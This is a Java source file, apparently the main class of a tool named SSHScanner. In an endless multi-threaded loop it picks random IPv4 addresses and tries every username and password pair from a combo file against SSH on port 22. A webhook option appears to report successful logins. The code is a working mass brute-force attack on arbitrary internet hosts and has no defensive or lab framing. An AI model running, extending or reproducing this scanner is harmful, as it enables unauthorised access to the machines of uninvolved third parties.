package com.thisisnzed.sshscanner;

import com.jcraft.jsch.JSch;
import com.thisisnzed.sshscanner.arguments.ArgumentParser;
import com.thisisnzed.sshscanner.arguments.Configuration;
import com.thisisnzed.sshscanner.combo.Combo;
import com.thisisnzed.sshscanner.session.Session;

import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.IntStream;

public class SSHScanner {

    private final Configuration configuration;
    private final ArgumentParser argumentParser;
    private final Session session;
    private final Random random;
    private final ConcurrentHashMap<String, Boolean> hosts;
    private final Combo combo;

    public SSHScanner(final String[] args) {
        this.configuration = new Configuration();
        this.argumentParser = new ArgumentParser(this.configuration, args);
        this.configuration.set("combo", "combo.txt");
        this.configuration.set("threads", 1);
        this.configuration.set("port", 22);
        this.configuration.set("timeout", 6000);
        this.configuration.set("webhook", "");
        this.configuration.set("verbose", true);

        this.argumentParser.loadArguments();

        this.random = new Random();
        this.combo = new Combo(this.configuration);
        this.hosts = new ConcurrentHashMap<>();
        this.session = new Session(combo, this.configuration, new JSch(), new java.util.Properties());
    }

    public void start() {
        IntStream.range(0, Integer.parseInt(String.valueOf(this.configuration.get("threads")))).forEach(i -> new Thread(() -> {
            while (true) {
                final String host = (random.nextInt(254) + 1) + "." + (random.nextInt(254) + 1) + "." + (random.nextInt(254) + 1) + "." + (random.nextInt(254) + 1);
                if (!hosts.containsKey(host))
                    this.combo.getCombo().stream().filter(combo -> hosts.getOrDefault(host, true)).forEach(combo -> hosts.put(host, session.connect(host, combo[0], combo[1])));
            }
        }).start());
    }
}